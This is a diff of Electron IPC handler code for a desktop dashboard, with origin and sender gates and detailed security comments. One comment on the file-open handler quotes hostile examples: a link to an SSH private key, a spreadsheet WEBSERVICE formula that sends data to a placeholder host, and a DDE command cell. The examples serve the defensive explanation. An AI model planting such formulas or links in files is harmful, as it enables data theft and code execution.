+    // Most callers throw the rejection through to the renderer as a hard
+    // refusal. `app-menu:execute` is the exception (see its handler above): it
+    // catches the throw, treats the outcome as a boolean, and uses it as a
+    // PER-ACTION gate inside `executeMenuItem`. Both callers use the same
+    // three gates — the difference is only what happens on rejection.
+    //
+    // (assertLocalDashboard is defined at createIpcRegistrar scope, above.)
+
+    // Crash artifacts left by a previous run, so the dashboard can say "this
+    // happened" instead of leaving the user to discover it themselves.
+
+    deps.ipcMain.handle("crash-reports:get", async (event) => {
+      await (0, deps.assertLocalDashboard)(event, "crash-reports:get");
+      // Absent injection means the shell was assembled without a collector —
+      // report "nothing to see" rather than failing the renderer's first call.
+      return (0, deps.crashNoticeSummary)(typeof deps.crashScan === "function" ? (0, deps.crashScan)() : null);
+    });
+
+    // Reveal, never read. The renderer names no path and receives no path: this
+    // resolves the log location in the trusted process from the scan it already
+    // performed, so the channel cannot be turned into "open an arbitrary file
+    // for me". Reveals the FILE (selected in its folder) rather than opening
+    // it, because the useful gesture is "hand this directory over" — the log
+    // sits beside chromium.log and the retained previous generation.
+    deps.ipcMain.handle("crash-reports:reveal", async (event) => {
+      await (0, deps.assertLocalDashboard)(event, "crash-reports:reveal");
+      const scan = typeof deps.crashScan === "function" ? (0, deps.crashScan)() : null;
+      if (!scan || !scan.crashLogPath) return { ok: false, error: "no crash log" };
+      try {
+        deps.shell.showItemInFolder(scan.crashLogPath);
+        return { ok: true };
+      } catch (e) {
+        (0, deps.log)(`crash-reports:reveal failed: ${e && e.message}`);
+        return { ok: false, error: String((e && e.message) || e) };
+      }
+    });
+
+    // Purge the HTTP cache of ONE remote-crew pane origin. The renderer asks for
+    // this when a pane's entry `<script type=module>` fires `error` (relayed as
+    // `mc-embedded-boot stage=script-error`) and again on an explicit Retry:
+    // a chunk 404 the gateway once served with `Cache-Control: immutable` is
+    // replayed from this cache on every load, so no tunnel rebuild, re-mint or
+    // gateway restart can ever get that pane past Loading -- only evicting the
+    // entry can. Scope is the pane's ORIGIN and the `cache` data type only:
+    // cookies, storage and the service worker are untouched, and the shell's
+    // own origin is refused (see `purgeableOrigin`). Sender-gated like every
+    // other channel that acts on this machine: the same preload serves a
+    // connection window pointed at a REMOTE gateway, and only the local
+    // dashboard shell -- the one that frames remote panes -- may evict a
+    // loopback origin's cache; `purgeableOrigin` bounds WHICH origin, the gate
+    // bounds WHO asks. After the gate, resolves to whether a purge ran and
+    // never throws into the renderer: the reload that follows must go ahead
+    // either way.
+    deps.ipcMain.handle("pane:clear-http-cache", async (event, origin) => {
+      await (0, deps.assertLocalDashboard)(event, "pane:clear-http-cache");
+      const target = (0, deps.purgeableOrigin)(origin, deps.backendUrl);
+      if (!target) {
+        (0, deps.log)(`${deps.PANE_ASSETS_PREFIX} clear-http-cache refused origin=${String(origin).slice(0, 128)}`);
+        return false;
+      }
+      const ses = event && event.sender && event.sender.session;
+      if (!ses || typeof ses.clearData !== "function") {
+        (0, deps.log)(`${deps.PANE_ASSETS_PREFIX} clear-http-cache unavailable origin=${target}`);
+        return false;
+      }
+      try {
+        await ses.clearData({ origins: [target], dataTypes: ["cache"] });
+        (0, deps.log)(`${deps.PANE_ASSETS_PREFIX} clear-http-cache origin=${target} cleared`);
+        return true;
+      } catch (e) {
+        (0, deps.log)(`${deps.PANE_ASSETS_PREFIX} clear-http-cache origin=${target} failed: ${e && e.message}`);
+        return false;
+      }
+    });
+
+    // Forward the Remote Crew pane ports a window on the launch port shows.
+    // In client-only mode that window's dashboard is a crew's gateway reached
+    // through the app's managed forward, and each pane it frames loads a port
+    // the crew's gateway opened on ITS machine, so the managed keeper must
+    // carry those ports too (tunnel-keeper.js). Admitted only from a top frame
+    // on the launch port's own dashboard origin, the one window the keeper's
+    // forward serves; a pane, an embedded page or another port's window is
+    // refused. The keeper itself answers null when this app keeps no forward
+    // for the launch port, so a local gateway's dashboard asks once and loads.
+    // A window's ports are released when it is destroyed.
+    const paneForwardSenders = new Set();
+    deps.ipcMain.handle("remote-crew:forward-pane-ports", async (event, ports) => {
+      const channel = "remote-crew:forward-pane-ports";
+      const sender = event && event.sender;
+      if (!sender || !event.senderFrame || event.senderFrame !== sender.mainFrame) {
+        (0, deps.log)(`${channel} rejected: sender is not a top frame`);
+        throw new Error(`${channel} is restricted to the launch port's dashboard`);
+      }
+      let origin = "";
+      try {
+        origin = new URL(event.senderFrame.url).origin;
+      } catch { /* an unreadable URL matches nothing */ }
+      if (origin !== deps.backendUrl) {
+        (0, deps.log)(`${channel} rejected for sender origin ${origin || "(unreadable)"}`);
+        throw new Error(`${channel} is restricted to the launch port's dashboard`);
+      }
+      if (typeof deps.gateway.forwardPanePorts !== "function") return null;
+      const owner = sender.id;
+      if (!paneForwardSenders.has(owner) && typeof sender.once === "function") {
+        paneForwardSenders.add(owner);
+        sender.once("destroyed", () => {
+          paneForwardSenders.delete(owner);
+          deps.gateway.releasePaneForwards(owner);
+        });
+      }
+      return deps.gateway.forwardPanePorts(owner, ports);
+    });
+
+    // WSL2 host-runtime readout, rendered read-only by the Host runtime card.
+    // Sender-restricted ON PURPOSE: the discovery result is a fact about THIS
+    // machine, so only WebContents served by this shell's own local gateway may
+    // enumerate it. Connection windows pointed at a remote gateway share this
+    // preload and must get a rejection instead of the host's distro inventory.
+    deps.ipcMain.handle("wsl:detect", async (event) => {
+      await (0, deps.assertLocalDashboard)(event, "wsl:detect");
+      return (0, deps.detectWsl)();
+    });
+
+    // What the main window's close button does, whether the tray icon shows,
+    // and whether minimizing hides the window to it. Deliberately narrower
+    // than `assertLocalDashboard`, which would hide the rows from a main
+    // window on a configured remote host and leave that user no way to change
+    // them. The sender must be the main window's
+    // top frame, still on its assigned dashboard origin. That trusts the main
+    // window's dashboard, local or remote, with visible, reversible two-valued
+    // preferences.
+    const assertMainWindowDashboard = (event, channel) => {
+      const refuse = (why) => {
+        (0, deps.logGateRejection)(event.sender, `${channel} rejected: ${why}`);
+        throw new Error(`${channel} is restricted to the main window's dashboard`);
+      };
+      const main = deps.windows.getMainWindow();
+      if (!main || deps.windows.windowForWebContents(event.sender) !== main) {
+        refuse("sender is not the main window");
+      }
+      if (!event.senderFrame || event.senderFrame !== event.sender.mainFrame) {
+        refuse("sender is not the top frame");
+      }
+      let origin = "";
+      let expected = "";
+      try {
+        origin = new URL(event.senderFrame.url).origin;
+        expected = new URL(main._mcBackendUrl).origin;
+      } catch {
+        // An unreadable URL matches nothing.
+      }
+      if (!origin || origin !== expected) {
+        refuse(`sender origin ${origin || "(unreadable)"} is not the main window's dashboard`);
+      }
+    };
+    deps.ipcMain.handle("close-action:get", async (event) => {
+      assertMainWindowDashboard(event, "close-action:get");
+      return deps.windows.closeAction.get();
+    });
+    deps.ipcMain.handle("close-action:set", async (event, value) => {
+      assertMainWindowDashboard(event, "close-action:set");
+      return deps.windows.closeAction.set(value);
+    });
+    deps.ipcMain.handle("tray-icon:get", async (event) => {
+      assertMainWindowDashboard(event, "tray-icon:get");
+      return deps.windows.trayIcon.get();
+    });
+    deps.ipcMain.handle("tray-icon:set", async (event, show) => {
+      assertMainWindowDashboard(event, "tray-icon:set");
+      return deps.windows.trayIcon.set(show);
+    });
+    deps.ipcMain.handle("minimize-to-tray:get", async (event) => {
+      assertMainWindowDashboard(event, "minimize-to-tray:get");
+      return deps.windows.minimizeToTray.get();
+    });
+    deps.ipcMain.handle("minimize-to-tray:set", async (event, on) => {
+      assertMainWindowDashboard(event, "minimize-to-tray:set");
+      return deps.windows.minimizeToTray.set(on);
+    });
+
+    // Open a file the chat referenced in the user's own editor, by handing its
+    // path to the OS default handler on the machine in front of them.
+    //
+    // Sibling to `crash-reports:reveal`, and gated the same way: this is not a
+    // read, it is a LAUNCH on the local machine, so it takes the full
+    // three-gate local-dashboard check. A connection window pointed at a REMOTE
+    // gateway shares this preload, and must never be able to open a file on the
+    // host running this shell.
+    //
+    // Trust nothing about the path either: the chat transcript is AGENT-authored
+    // (and can carry externally-influenced content), so a hostile
+    // `[open](/Users/me/.ssh/id_rsa)` must not become "launch this". Hence the
+    // same validation shape the `mochi-pet:open-image` handler already uses:
+    //   - realpathSync BEFORE the extension test, so a `.md` symlink to a key
+    //     file is judged by what it actually resolves to;
+    //   - a text/document extension allowlist — a fixed set, deliberately not
+    //     user-extensible (a configurable list reopens the external-scheme
+    //     surface external-scheme.js documents as rejected);
+    //   - a regular-file requirement;
+    //   - a non-empty `openPath` return means the OS refused; surface it rather
+    //     than failing silently.
+    // The chip that reaches this channel is only actionable after the gateway's
+    // own /api/file-read probe has already confirmed a non-sensitive regular
+    // file (is_sensitive_path), so the credential-path denylist is enforced
+    // upstream; the checks here are defence in depth on the launch primitive.
+    deps.ipcMain.handle("dashboard:open-file", async (event, filePath) => {
+      await (0, deps.assertLocalDashboard)(event, "dashboard:open-file");
+      if (typeof filePath !== "string" || filePath === "") {
+        return { ok: false, error: "no path" };
+      }
+      const fs = require("fs");
+      const nodePath = require("path");
+      const { openPathHardened } = require("../../open-path");
+      // ONLY extensions whose OS default handler opens the file in a
+      // PLAIN-TEXT viewer/editor and CANNOT execute the file's contents. That
+      // predicate -- not a hand-kept list -- is the security bar: shell.openPath
+      // launches the OS default handler and the path is agent-authored, so any
+      // type whose handler can run embedded content is arbitrary code execution.
+      // Four families are therefore excluded, all reachable only through this
+      // affordance (the built-in viewer, which renders inert, remains for them):
+      //   - interpreter/shell scripts (`.js`/`.mjs`/`.cjs` -> Windows Script Host,
+      //     `.py`/`.rb` -> interpreters, `.sh`/`.ps1` -> a shell);
+      //   - browser ACTIVE DOCUMENTS (`.html`/`.htm`/`.svg`/`.xml`) -- the browser
+      //     opens them at a `file://` origin and EXECUTES embedded JavaScript;
+      //   - RICH DOCUMENTS whose default app has a content-execution surface
+      //     (`.doc`/`.docx`/`.odt` -> Word/LibreOffice VBA/macros incl. AutoOpen,
+      //     `.rtf` -> Word OLE, `.pdf` -> reader JavaScript). Legacy `.doc` is the
+      //     clearest case (VBA/AutoOpen), but the whole family fails the predicate;
+      //     and
+      //   - SPREADSHEETS (`.csv`/`.tsv`/`.xls`/`.xlsx`/`.ods`). These LOOK like
+      //     plain text, and that is the trap: the extension decides the app, and
+      //     the default app for them is Excel / Numbers / LibreOffice Calc, which
+      //     EVALUATES any cell opening with `=`, `+`, `-` or `@` as a formula. An
+      //     agent-authored `=WEBSERVICE("http://host/"&A1)` exfiltrates the sheet
+      //     and `=cmd|'/c ...'!A0` reaches DDE, so the bytes are executed by the
+      //     handler even though nothing about the file is a program. Judge the
+      //     predicate on the app that actually opens the type, not on how the
+      //     bytes read to a human.
+      const OPENABLE_EXTS = new Set([
+        ".md", ".markdown", ".txt", ".text", ".rst", ".org", ".log",
+        ".json", ".jsonc", ".json5", ".yaml", ".yml", ".toml", ".ini", ".cfg", ".conf", ".env",
+        ".css", ".graphql", ".proto",
+      ]);
+      try {
+        // realpath BEFORE the extension test: a `.md` symlink to a key file
+        // must be judged by what it actually resolves to.
+        const real = fs.realpathSync(filePath);
+        if (!OPENABLE_EXTS.has(nodePath.extname(real).toLowerCase())) {
+          return { ok: false, error: "unsupported file type" };
+        }
+        if (!fs.statSync(real).isFile()) {
+          return { ok: false, error: "not a file" };
+        }
+        // Hand the launch to the hardened wrapper, not `shell.openPath`: on
+        // Linux the bare `xdg-open` name resolves against the inherited PATH,
+        // so an agent-writable leading entry would shadow the launcher and turn
+        // an open into arbitrary code execution. `openPathHardened` narrows PATH
+        // across the native launch and is a drop-in (same `Promise<string>`,
+        // empty on success) -- it hardens WHICH launcher runs, while the
+        // realpath/extension/isFile checks above decide WHAT it may open.
+        // Non-empty return value means the OS refused to open it.
+        const err = await openPathHardened(deps.shell, real);
+        if (err) {
+          (0, deps.log)(`dashboard:open-file: OS refused ${real}: ${err}`);
+          return { ok: false, error: err };
+        }
+        return { ok: true };
+      } catch (e) {
+        (0, deps.log)(`dashboard:open-file refused: ${e && e.message}`);
+        return { ok: false, error: String((e && e.message) || e) };
+      }
+    });
+
+    // The OS-native folder chooser behind the project picker's "Open system
+    // folder picker" button. Electron's own dialog draws it from this process,
+    // so it spawns nothing and needs no sandbox allowance.
+    //
+    // Gated like `crash-reports:reveal`: a dialog is an action on the machine in
+    // front of the user, and the folder it returns is a path on THIS machine, so
+    // it is only meaningful to a window whose gateway runs here. A connection
+    // window pointed at a remote gateway shares this preload and is refused.
+    //
+    // The renderer supplies nothing. The handler reads only the event: the
+    // options are fixed here, so a page cannot choose the default path, the
+    // properties (files, multi-select) or the filters. The answer is the one
+    // absolute folder the user chose, or null for a cancel or a malformed
+    // result; a dialog that fails to open rejects, so the picker can tell the
+    // user instead of reading it as a cancel. The picker validates the path
+    // through the gateway's directory listing before using it. The chosen path
+    // is never logged.
+    deps.ipcMain.handle("dashboard:pick-folder", async (event) => {
+      await (0, deps.assertLocalDashboard)(event, "dashboard:pick-folder");
+      if (deps.folderPickOpen) return null;
+      deps.folderPickOpen = true;
+      try {
+        const owner = deps.windows.windowForWebContents(event.sender);
+        const parent = owner && !(typeof owner.isDestroyed === "function" && owner.isDestroyed())
+          ? owner
+          : null;
+        const options = { properties: ["openDirectory"] };
+        let result;
+        try {
+          result = parent
+            ? await deps.dialog.showOpenDialog(parent, options)
+            : await deps.dialog.showOpenDialog(options);
+        } catch (e) {
+          (0, deps.log)(`dashboard:pick-folder failed: ${e && e.message}`);
+          throw new Error("dashboard:pick-folder could not open the folder dialog");
+        }
+        if (!result || result.canceled || !Array.isArray(result.filePaths)) return null;
+        const picked = result.filePaths[0];
+        if (typeof picked !== "string" || !require("path").isAbsolute(picked)) return null;
+        return picked;
+      } finally {
+        deps.folderPickOpen = false;
+      }
+    });
+
+    // Whether this window may use `dashboard:pick-folder`, so the picker shows
+    // the button only where it works. Runs the same gate and answers a bare
+    // boolean -- the same fact a gated channel's rejection already tells -- and
+    // never opens a dialog.
+    deps.ipcMain.handle("dashboard:can-pick-folder", async (event) => {
+      try {
+        await (0, deps.assertLocalDashboard)(event, "dashboard:can-pick-folder");
+        return true;
+      } catch {
+        return false;
+      }
+    });
+
+    // First-run setup's "connect to a crew on another machine" exit. It stops the
+    // gateway this app started and reconnects the main window to a crew the
+    // user names, so it is an action on the machine in front of the user and
+    // takes the full three-gate check. The supervisor then decides from its own
+    // state whether that window may switch: the main window only, on a gateway
+    // this app spawned. The renderer supplies nothing either way.
+    //
+    // `can-...` answers a bare boolean so setup shows the link only where the
+    // switch works, and never opens the form.
+    deps.ipcMain.handle("first-run:can-use-remote-crew", async (event) => {
+      try {
+        await (0, deps.assertLocalDashboard)(event, "first-run:can-use-remote-crew");
+      } catch {
+        return false;
+      }
+      return deps.gateway.canSwitchToRemoteCrew(deps.windows.windowForWebContents(event.sender)) === true;
+    });
+    deps.ipcMain.handle("first-run:use-remote-crew", async (event) => {
+      await (0, deps.assertLocalDashboard)(event, "first-run:use-remote-crew");
+      return deps.gateway.switchToRemoteCrew(deps.windows.windowForWebContents(event.sender));
+    });
+
+    // Settings → About's Restart gateway. It stops and respawns the gateway this
+    // app runs, so it takes the same three-gate check, and the supervisor alone
+    // decides from its own state whether the sender's window may restart: the
+    // main window, connected to a gateway this app spawned. `can-...` answers a
+    // bare boolean so About shows the control only where the restart works.
+    deps.ipcMain.handle("gateway:can-restart", async (event) => {
+      try {
+        await (0, deps.assertLocalDashboard)(event, "gateway:can-restart");
+      } catch {
+        return false;
+      }
+      return deps.gateway.canRestartGateway(deps.windows.windowForWebContents(event.sender)) === true;
+    });
+    deps.ipcMain.handle("gateway:restart", async (event) => {
+      await (0, deps.assertLocalDashboard)(event, "gateway:restart");
+      return deps.gateway.restartGateway(deps.windows.windowForWebContents(event.sender));
+    });
+
+    // Open the user's own terminal app in a project directory. Gated like
+    // `dashboard:open-file` because it is a LAUNCH on the machine in front of
+    // the user, and a connection window pointed at a remote gateway shares this
+    // preload.
+    //
+    // `detect` lists the allowlisted apps installed here, for the Settings
+    // picker; the pick itself is gateway config. `open` takes the opaque grant
+    // the gateway minted after its own checks (owner, direct-local request,
+    // integrated terminal enabled, an app picked) and starts nothing unless the
+    // gateway redeems it. The app id and the directory come from that
+    // redemption, the binary and argv from the allowlist in
+    // external-terminal.js, and no OS opener is involved at any step.
+    //
+    // `detect` answers a refused window `{ apps: [], capable: false }` instead
+    // of rejecting, as `dashboard:can-pick-folder` answers false: a desktop
+    // window reaching a remote crew through an SSH tunnel is an ordinary
+    // window that can never launch here, not a failed check, so the renderer
+    // hides the row and the picker rather than reporting an error a Retry
+    // cannot clear. The gate still runs (and logs) before any probe, so a
+    // refused window learns only this one bit, and `open` keeps rejecting.
+    deps.ipcMain.handle("external-terminal:detect", async (event) => {
+      try {
+        await (0, deps.assertLocalDashboard)(event, "external-terminal:detect");
+      } catch {
+        return { apps: [], capable: false };
+      }
+      return { apps: deps.externalTerminal.detectTerminals(), capable: true };
+    });
+    deps.ipcMain.handle("external-terminal:open", async (event, grant) => {
+      await (0, deps.assertLocalDashboard)(event, "external-terminal:open");
+      return deps.externalTerminal.launchFromGrant(grant, {
+        backendUrl: deps.backendUrl,
+        getSecret: () => (0, deps.readInternalSecret)(deps.backendUrl),
+        fetchFn: deps.fetchFn,
+        log: deps.log,
+      });
+    });
+
+    // Open a remote Crew reached through the Kiro relay, in its own window
+    // (relay-crew-open.js). The renderer sends only the endpoint ID; main asks
+    // this shell's own gateway for the access token with the local secret, so
+    // neither the token nor the Crew URL crosses the bridge. Gated like
+    // `external-terminal:open`, because a connection window pointed at a
+    // remote gateway shares this preload. Never rejects: the dashboard gets
+    // `{ ok }` or `{ ok: false, error }`.
+    deps.ipcMain.handle("relay-crew:open", async (event, endpointId) => {
+      if (!(0, deps.isEndpointId)(endpointId)) return { ok: false, error: "INVALID_ENDPOINT" };
+      try {
+        await (0, deps.assertLocalDashboard)(event, "relay-crew:open");
+      } catch {
+        return { ok: false, error: "UNAVAILABLE" };
+      }
+      return (0, deps.relayCrewOpener)().open(endpointId);
+    });
+
+    // Close every relay Crew window now: the dashboard calls this once its own
+    // Sign out or Switch account has landed. Takes nothing from the renderer and
+    // can only close. Gated like `relay-crew:open`. Reads the opener without
+    // building it, so a shell that never opened a relay Crew does nothing.
+    deps.ipcMain.handle("relay-crew:close-all", async (event) => {
+      try {
+        await (0, deps.assertLocalDashboard)(event, "relay-crew:close-all");
+      } catch {
+        return;
+      }
+      if (deps.relayOpener) deps.relayOpener.closeAll("SIGNED_OUT");
+    });
+
+    // A relay Crew as a pane in the main window, below the dashboard's own top
+    // bar, instead of in a window of its own. Nothing in the dashboard calls
+    // these yet. The renderer sends the endpoint ID and the pane's rect in CSS
+    // px with its own viewport size (as `browser:set-bounds` does); main picks
+    // the window and the dashboard view itself. The pane's page gets no preload,
+    // so it can send none of these. Never rejects.
+    const paneRect = (parent, rect, viewport) => {
+      const content = parent.getContentBounds();
+      return (0, deps.normalizeBounds)((0, deps.scaleRect)(rect, (0, deps.deriveScale)(viewport, content)), content);
+    };
+    // Other local dashboard windows hand their opens to the listening main dashboard.
+    const relayHandoff = (0, deps.createRelayCrewHandoff)({ showMainWindow: (o) => deps.windows.showMainWindow(o) });
+    deps.ipcMain.handle("relay-crew:open-requests", async (event, on, seq) => {
+      try {
+        await (0, deps.assertLocalDashboard)(event, "relay-crew:open-requests");
+        assertMainWindowDashboard(event, "relay-crew:open-requests");
+      } catch {
+        return;
+      }
+      relayHandoff.listen(event.sender, on, seq);
+    });
+    deps.ipcMain.handle("relay-crew:open-pane", async (event, endpointId, rect, viewport) => {
+      if (!(0, deps.isEndpointId)(endpointId)) return { ok: false, error: "INVALID_ENDPOINT" };
+      const main = deps.windows.getMainWindow();
+      try {
+        await (0, deps.assertLocalDashboard)(event, "relay-crew:open-pane");
+        if (main && deps.windows.windowForWebContents(event.sender) !== main) {
+          if (!event.senderFrame || event.senderFrame !== event.sender.mainFrame) {
+            (0, deps.logGateRejection)(event.sender, "relay-crew:open-pane rejected: sender is not the top frame");
+            throw new Error("relay-crew:open-pane is restricted to a dashboard's top frame");
+          }
+          return relayHandoff.handOff(endpointId);
+        }
+        assertMainWindowDashboard(event, "relay-crew:open-pane");
+      } catch {
+        return { ok: false, error: "UNAVAILABLE" };
+      }
+      const parent = main;
+      const bounds = paneRect(parent, rect, viewport);
+      // Before any mint, like a bad ID.
+      if (!bounds) return { ok: false, error: "INVALID_BOUNDS" };
+      return (0, deps.relayCrewOpener)().open(endpointId, { parent, dashboard: parent._mcView, bounds });
+    });
+
+    // The calls that steer an open pane take it only from the dashboard view
+    // that opened it. Synchronous, since bounds arrive on every resize. Answers
+    // the pane's handle, or null and nothing changes.
+    const paneForSender = (event, channel, endpointId) => {
+      if (!(0, deps.isEndpointId)(endpointId) || !deps.relayOpener) return null;
+      try {
+        assertMainWindowDashboard(event, channel);
+      } catch {
+        return null;
+      }
+      const pane = deps.relayOpener.paneFor(endpointId);
+      if (!pane) return null;
+      if (pane.dashboard.webContents !== event.sender) {
+        (0, deps.logGateRejection)(event.sender, `${channel} rejected: sender did not open this pane`);
+        return null;
+      }
+      return pane.handle;
+    };
+    deps.ipcMain.handle("relay-crew:pane-bounds", (event, endpointId, rect, viewport) => {
+      const pane = paneForSender(event, "relay-crew:pane-bounds", endpointId);
+      if (pane) pane.setBounds(paneRect(deps.windows.getMainWindow(), rect, viewport));
+    });
+    // A local menu or dialog over the pane: the native view would paint above
+    // it, so the pane hides while it is up (browser-view.js header note 2).
+    deps.ipcMain.handle("relay-crew:pane-overlay", (event, endpointId, active) => {
+      if (typeof active !== "boolean") return;
+      const pane = paneForSender(event, "relay-crew:pane-overlay", endpointId);
+      if (pane) pane.setOverlay(active);
+    });
+    // Another tab is in front of a warm pane: it stays loaded but hidden, and
+    // shows only once both this and the overlay are off.
+    deps.ipcMain.handle("relay-crew:pane-inactive", (event, endpointId, inactive) => {
+      if (typeof inactive !== "boolean") return;
+      const pane = paneForSender(event, "relay-crew:pane-inactive", endpointId);
+      if (pane) pane.setInactive(inactive);
+    });
+    deps.ipcMain.handle("relay-crew:pane-close", (event, endpointId) => {
+      const pane = paneForSender(event, "relay-crew:pane-close", endpointId);
+      if (pane) pane.close();
+    });
+    // Connected computers (29949): the native consent for sharing this
+    // computer with a Remote Crew. The page passes only the consent id its own
+    // gateway minted; the crew name, local tools and folder all come from the
+    // gateway and the OS picker here, so a page cannot widen what is granted.
+    // Registered only while the preview was on at launch, as the preload's
+    // bridge is: with it off the shell's channel set is unchanged.
+    if (deps.connectedComputersEnabled === true) {
+      deps.ipcMain.handle("connected-computers:confirm", async (event, consent) => {
+        await (0, deps.assertLocalDashboard)(event, "connected-computers:confirm");
+        return deps.connectedComputers.confirmConsent(consent, {
+          dialog: deps.dialog,
+          window: deps.windows.windowForWebContents(event.sender) || null,
+          backendUrl: deps.backendUrl,
+          getSecret: () => (0, deps.readInternalSecret)(deps.backendUrl),
+          fetchFn: deps.fetchFn,
+        });
+      });
+    }
+
+    deps.ipcMain.handle("zoom:get", (event) =>
+      deps.windows.chrome.getZoom(event.sender));
+    deps.ipcMain.handle("zoom:set", (event, factor) =>
+      deps.windows.chrome.setZoom(event.sender, factor));
+    deps.ipcMain.handle("zoom:step", (event, direction) =>
+      deps.windows.chrome.stepZoom(event.sender, direction));
+
+    // The window façade resolves every request from event.sender and keeps the
+    // native panel internals private to that owning window.
+    deps.ipcMain.handle("browser:open", (event, panelId, url) =>
+      deps.windows.browser.open(event.sender, panelId, url));
+    deps.ipcMain.handle("browser:navigate", (event, panelId, url) =>
+      deps.windows.browser.navigate(event.sender, panelId, url));
+    deps.ipcMain.handle("browser:set-bounds", (event, panelId, rect, viewport) =>
+      deps.windows.browser.setBounds(event.sender, panelId, rect, viewport));
+    deps.ipcMain.handle("browser:set-overlay", (event, panelId, active) =>
+      deps.windows.browser.setOverlay(event.sender, panelId, active));
+    deps.ipcMain.handle("browser:set-inactive", (event, panelId, value) =>
+      deps.windows.browser.setInactive(event.sender, panelId, value));
+    deps.ipcMain.handle("browser:close", (event, panelId) =>
+      deps.windows.browser.close(event.sender, panelId));
+    deps.ipcMain.handle("browser:get-state", (event, panelId) =>
+      deps.windows.browser.getState(event.sender, panelId));
+    // Element annotation on the native page (human-initiated; closed op set).
+    deps.ipcMain.handle("browser:annotate", (event, panelId, op, args) =>
+      deps.windows.browser.annotate(event.sender, panelId, op, args));
+
+    deps.ipcMain.on("mic:denied", () => deps.windows.security.micDenied());
+
+    // Diagnostics accept only the sender identity and payload. The window
+    // owner enforces the primary-renderer attribution rule before buffering.
+    deps.ipcMain.on("memory-sample", (event, payload) =>
+      deps.windows.diagnostics.memorySample(event.sender, payload));
+
+    deps.shellRegistered = true;
+    return deps.summonDashboard;
+  }
+
+module.exports = { registerShell };
